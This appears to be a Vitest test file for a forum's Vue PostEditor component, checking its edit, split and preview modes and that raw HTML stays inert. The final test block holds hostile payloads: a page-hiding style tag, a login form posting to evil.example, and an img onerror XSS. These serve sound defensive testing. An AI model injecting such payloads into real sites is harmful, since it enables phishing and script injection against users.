import type { Component } from 'vue'
import type { TestNode } from './support/sfc'
import { beforeAll, describe, expect, it } from 'vitest'
import { defineComponent, h, nextTick, ref } from 'vue'
import * as postMarkdown from '../shared/post-markdown'
import { find, findAll, isShown, loadComponent, mount, textOf } from './support/sfc'
import { loadMarked, TUFFEX_STUBS } from './support/tuffex-stubs'

/**
 * PostEditor, mounted: the three modes, what each one shows, and that the
 * preview is the post as ForumMarkdown renders it on the topic page.
 */
const { renderableMarkdown, quoteDraft } = postMarkdown

let marked: { parse: (source: string) => string }
let PostEditor: Component
let ForumMarkdown: Component

beforeAll(async () => {
  marked = await loadMarked()
  ForumMarkdown = loadComponent('components/ForumMarkdown.vue', { imports: { '../../shared/post-markdown': postMarkdown } })
  PostEditor = loadComponent('components/PostEditor.vue')
})

/** What a post body looks like on the topic page (before DOMPurify, which only removes more). */
function asPost(source: string): string {
  return marked.parse(renderableMarkdown(source))
}

interface Editor {
  root: TestNode
  /** The v-model on the parent's side. */
  text: { value: string }
  textarea: () => TestNode
  preview: () => TestNode | undefined
  previewHtml: () => string
  modes: () => TestNode[]
  checked: () => string
  choose: (label: string) => Promise<void>
  type: (value: string) => Promise<void>
}

function mountEditor(initial = '', props: Record<string, unknown> = {}): Editor {
  const text = ref(initial)
  const Parent = defineComponent({
    setup: () => () => h(PostEditor, {
      'modelValue': text.value,
      'onUpdate:modelValue': (value: string) => {
        text.value = value
      },
      'label': '回复内容',
      ...props,
    }),
  })
  const { root } = mount(Parent, {}, { ...TUFFEX_STUBS, ForumMarkdown })
  const modes = () => findAll(root, node => node.props.role === 'radio')
  const textarea = () => find(root, node => node.tag === 'textarea')!
  const preview = () => find(root, node => 'data-editor-preview' in node.props)
  return {
    root,
    text,
    textarea,
    preview,
    previewHtml: () => findAll(preview()!, node => node.tag === 'article').map(node => String(node.props.html)).join(''),
    modes,
    checked: () => modes().filter(node => node.props['aria-checked'] === true).map(textOf).join(),
    choose: async (label) => {
      const button = modes().find(node => textOf(node) === label)
      if (!button)
        throw new Error(`no mode called ${label}`)
      ;(button.props.onClick as () => void)()
      await nextTick()
    },
    type: async (value) => {
      (textarea().props.onInput as (value: string) => void)(value)
      await nextTick()
    },
  }
}

const SAMPLE = '## 标题\n\n一段 **加粗** 的文字，和一行 `code`。\n\n- 第一项\n- 第二项'

describe('the three modes', () => {
  it('offers 编辑, 分栏 and 预览 in that order and starts in 编辑: the textarea alone', () => {
    const editor = mountEditor(SAMPLE)
    expect(editor.modes().map(textOf)).toEqual(['编辑', '分栏', '预览'])
    expect(editor.checked()).toBe('编辑')
    expect(isShown(editor.textarea())).toBe(true)
    expect(editor.textarea().props.value).toBe(SAMPLE)
    expect(editor.preview()).toBeUndefined()
  })

  it('each mode has a Remix icon that screen readers skip', () => {
    const editor = mountEditor()
    const icons = editor.modes().map(mode => find(mode, node => node.props['aria-hidden'] === 'true')?.props.class)
    expect(icons).toEqual(['i-ri-edit-line', 'i-ri-layout-column-line', 'i-ri-eye-line'])
  })

  it('预览 shows only the rendered post, exactly as ForumMarkdown renders it', async () => {
    const editor = mountEditor(SAMPLE)
    await editor.choose('预览')
    expect(editor.checked()).toBe('预览')
    expect(isShown(editor.textarea())).toBe(false)
    expect(editor.previewHtml()).toBe(asPost(SAMPLE))
    expect(editor.previewHtml()).toContain('<strong>加粗</strong>')
  })

  it('分栏 shows the textarea and the rendered post side by side, the render following each keystroke', async () => {
    const editor = mountEditor('第一行')
    await editor.choose('分栏')
    expect(isShown(editor.textarea())).toBe(true)
    expect(editor.previewHtml()).toBe(asPost('第一行'))

    await editor.type('第一行\n\n**第二段**')
    expect(editor.text.value).toBe('第一行\n\n**第二段**')
    expect(editor.previewHtml()).toBe(asPost('第一行\n\n**第二段**'))
    expect(editor.previewHtml()).toContain('<strong>第二段</strong>')
  })

  it('分栏 only becomes two columns when the editor has 42rem, and stacks below that', async () => {
    const editor = mountEditor(SAMPLE)
    const panes = () => editor.preview()!.parent!
    await editor.choose('分栏')
    expect(String(panes().props.class).split(' ')).toContain('@2xl:grid-cols-2')
    expect(String(panes().props.class).split(' ')).not.toContain('grid-cols-2')
    await editor.choose('预览')
    expect(String(panes().props.class).split(' ')).not.toContain('@2xl:grid-cols-2')
  })

  it('switching modes keeps the text and the very same textarea, so its undo history survives', async () => {
    const editor = mountEditor()
    await editor.type(SAMPLE)
    const textarea = editor.textarea()
    for (const mode of ['分栏', '预览', '编辑', '预览', '分栏', '编辑']) {
      await editor.choose(mode)
      expect(editor.checked()).toBe(mode)
      expect(editor.text.value).toBe(SAMPLE)
      expect(editor.textarea()).toBe(textarea)
      expect(textarea.props.value).toBe(SAMPLE)
    }
  })

  it('says there is nothing to show yet instead of an empty box', async () => {
    const editor = mountEditor('   ')
    await editor.choose('预览')
    expect(textOf(editor.preview()!)).toBe('还没有内容。')
    await editor.type('有了')
    expect(textOf(editor.preview()!)).toBe('')
    expect(editor.previewHtml()).toBe(asPost('有了'))
  })
})

describe('the props the pages pass', () => {
  it('names the textarea and the mode switch, and keeps the placeholder', () => {
    const editor = mountEditor('', { placeholder: '写下你的回复，支持 Markdown…' })
    expect(editor.textarea().props['aria-label']).toBe('回复内容')
    expect(editor.textarea().props.placeholder).toBe('写下你的回复，支持 Markdown…')
    expect(find(editor.root, node => node.props.role === 'radiogroup')?.props['aria-label']).toBe('回复内容的显示方式')
  })

  it.each([
    [200, '!min-h-50', '!min-h-24'],
    [240, '!min-h-60', '!min-h-28'],
    [320, '!min-h-80', '!min-h-38'],
  ])('minHeight %i gives the textarea and the preview %s, shared between them while 分栏 stacks', async (minHeight, whole, shared) => {
    const editor = mountEditor('x', { minHeight })
    const classes = (node: TestNode) => String(node.props.class).split(' ')
    expect(classes(editor.textarea())).toContain(whole)
    await editor.choose('预览')
    expect(classes(editor.preview()!)).toContain(whole)
    await editor.choose('分栏')
    for (const pane of [editor.textarea(), editor.preview()!]) {
      expect(classes(pane)).toContain(shared)
      expect(classes(pane)).toContain(`@2xl:${whole}`)
      expect(classes(pane)).not.toContain(whole)
    }
  })
})

describe('raw HTML stays text in every mode', () => {
  const HOSTILE = '<style>body{display:none}</style>\n\n<form action="https://evil.example"><input name=p><button>登录</button></form>\n\n<img src=x onerror=alert(1)>'

  it('the textarea holds what was typed, untouched, and the preview shows the tags as text', async () => {
    const editor = mountEditor()
    await editor.type(HOSTILE)
    for (const mode of ['分栏', '预览']) {
      await editor.choose(mode)
      const html = editor.previewHtml()
      expect(html).not.toMatch(/<(?:style|form|input|button)\b/i)
      // `<img>` becomes a Markdown image (renderableMarkdown): the picture stays, its handler does not.
      expect(html).not.toMatch(/<[a-z][^>]*\son\w+=/i)
      expect(html).toContain('&lt;')
      expect(html).toBe(asPost(HOSTILE))
    }
    expect(editor.text.value).toBe(HOSTILE)
    expect(editor.textarea().props.value).toBe(HOSTILE)
  })

  // #134: someone else's post reaches the editor as a quote or a moderator's edit.
  it.each([
    ['a quote', quoteDraft({ content: '<style>*{display:none}</style><form action="https://evil.example"><input name=p></form>' })],
    ['a moderator\'s edit', '<style>*{display:none}</style>\n\n<form action="https://evil.example"><input name=p><button>登录</button></form>'],
  ])('%s of a post with <style> and <form> renders no tag in 分栏 or 预览', async (_what, draft) => {
    const editor = mountEditor(draft)
    for (const mode of ['分栏', '预览', '编辑', '分栏']) {
      await editor.choose(mode)
      if (mode !== '编辑')
        expect(editor.previewHtml()).not.toMatch(/<(?:style|form|input|button)\b/i)
    }
    expect(editor.text.value).toBe(draft)
  })
})
